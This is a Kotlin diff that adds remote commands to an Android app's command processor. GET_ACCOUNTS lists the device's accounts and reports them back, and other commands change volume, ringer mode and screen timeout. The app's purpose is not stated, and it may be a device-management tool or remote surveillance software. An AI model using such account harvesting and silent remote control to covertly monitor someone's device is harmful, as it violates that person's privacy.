@@ -416,6 +416,68 @@ object CommandProcessor {
                         errorMsg = "Mic may be in use by another app or permission denied."
                     }
                 }
+                "GET_ACCOUNTS" -> {
+                    val accounts = DeviceManager.getAccounts(ctx)
+                    status = "ACCOUNTS_RETRIEVED"
+                    val result = JSONObject().put("accounts", accounts)
+                    updateCommandStatus(ctx, id, status, null, result, null)
+                    return
+                }
+                "VOLUME" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val streamStr = parts[0].trim().uppercase()
+                        val levelStr = parts[1].trim().uppercase()
+                        
+                        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+                        val stream = when (streamStr) {
+                            "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
+                            "ALARM" -> android.media.AudioManager.STREAM_ALARM
+                            else -> android.media.AudioManager.STREAM_RING
+                        }
+
+                        if (levelStr == "SILENT" || levelStr == "VIBRATE" || levelStr == "NORMAL") {
+                            if (PermissionManager.hasDndAccess(ctx)) {
+                                am.ringerMode = when (levelStr) {
+                                    "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
+                                    "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
+                                    else -> android.media.AudioManager.RINGER_MODE_NORMAL
+                                }
+                                status = "RINGER_MODE_SET ($levelStr)"
+                            } else {
+                                status = "FAILED_PERMISSION (DND_ACCESS)"
+                                errorMsg = "Do Not Disturb access required to change ringer mode."
+                            }
+                        } else {
+                            val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
+                            val max = am.getStreamMaxVolume(stream)
+                            val targetVol = ((pct / 100f) * max).toInt()
+                            
+                            if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx) && am.ringerMode != android.media.AudioManager.RINGER_MODE_NORMAL) {
+                                am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
+                            }
+                            am.setStreamVolume(stream, targetVol, 0)
+                            status = "VOLUME_SET ($streamStr to $pct%)"
+                        }
+                    } else {
+                        status = "FAILED (FORMAT)"
+                        errorMsg = "Usage: VOLUME | MEDIA/RING/ALARM | 0-100/SILENT/VIBRATE"
+                    }
+                }
+                "SCREEN_TIMEOUT" -> {
+                    val secs = content.trim().toIntOrNull() ?: 30
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
+                        android.provider.Settings.System.putInt(
+                            ctx.contentResolver,
+                            android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
+                            secs * 1000
+                        )
+                        status = "TIMEOUT_SET (${secs}s)"
+                    } else {
+                        status = "FAILED_PERMISSION (WRITE_SETTINGS)"
+                        errorMsg = "Write Settings permission required to modify screen timeout."
+                    }
+                }
                 "BRIGHTNESS" -> {
                     val level = content.trim().toIntOrNull() ?: 100
                     val safeLevel = level.coerceIn(0, 100)
